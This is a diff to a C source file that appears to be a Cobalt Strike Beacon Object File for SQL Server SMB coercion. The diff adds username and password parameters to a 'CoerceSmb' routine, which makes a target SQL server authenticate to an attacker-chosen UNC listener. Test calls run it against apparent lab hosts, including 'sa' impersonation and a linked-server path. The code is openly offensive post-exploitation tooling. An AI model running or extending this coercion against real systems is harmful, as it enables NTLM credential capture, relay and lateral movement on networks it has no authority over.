@@ -3,7 +3,7 @@
 #include "sql.c"
 
 
-void CoerceSmb(char* server, char* database, char* link, char* impersonate, char* listener)
+void CoerceSmb(char* server, char* user, char* password, char* database, char* link, char* impersonate, char* listener)
 {
     SQLHENV env		= NULL;
     SQLHSTMT stmt 	= NULL;
@@ -15,11 +15,11 @@ void CoerceSmb(char* server, char* database, char* link, char* impersonate, char
 
     if (link == NULL)
 	{
-		dbc = ConnectToSqlServer(&env, server, database);
+		dbc = ConnectToSqlServer(&env, server, user, password, database);
 	}
 	else
 	{
-		dbc = ConnectToSqlServer(&env, server, NULL);
+		dbc = ConnectToSqlServer(&env, server, user, password, NULL);
 	}
 
     if (dbc == NULL) {
@@ -82,6 +82,8 @@ VOID go(
 ) 
 {
 	char* server;
+	char* user;
+	char* password;
 	char* database;
 	char* link;
 	char* impersonate;
@@ -94,12 +96,16 @@ VOID go(
 	BeaconDataParse(&parser, Buffer, Length);
 	
 	server	 	= BeaconDataExtract(&parser, NULL);
+	user	 	= BeaconDataExtract(&parser, NULL);
+	password 	= BeaconDataExtract(&parser, NULL);
 	database 	= BeaconDataExtract(&parser, NULL);
 	link 		= BeaconDataExtract(&parser, NULL);
 	impersonate = BeaconDataExtract(&parser, NULL);
 	listener 	= BeaconDataExtract(&parser, NULL);
 
 	server = *server == 0 ? "localhost" : server;
+	user = *user == 0 ? NULL : user;
+	password = *password == 0 ? NULL : password;
 	database = *database == 0 ? "master" : database;
 	link = *link  == 0 ? NULL : link;
 	impersonate = *impersonate == 0 ?  NULL : impersonate;
@@ -114,7 +120,7 @@ VOID go(
 		return;
 	}
 	
-	CoerceSmb(server, database, link, impersonate, listener);
+	CoerceSmb(server, user, password, database, link, impersonate, listener);
 
 	printoutput(TRUE);
 };
@@ -124,13 +130,13 @@ VOID go(
 int main()
 {
 	internal_printf("============ BASE TEST ============\n\n");
-	CoerceSmb("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "\\\\10.2.99.1");
+	CoerceSmb("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, NULL, "\\\\10.2.99.1");
 
 	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
-	CoerceSmb("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "\\\\10.2.99.1");
+	CoerceSmb("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, "sa", "\\\\10.2.99.1");
 
 	internal_printf("\n\n============ LINK TEST ============\n\n");
-	CoerceSmb("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "\\\\10.2.99.1");
+	CoerceSmb("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", "BRAAVOS", NULL, "\\\\10.2.99.1");
 }
 
 #endif
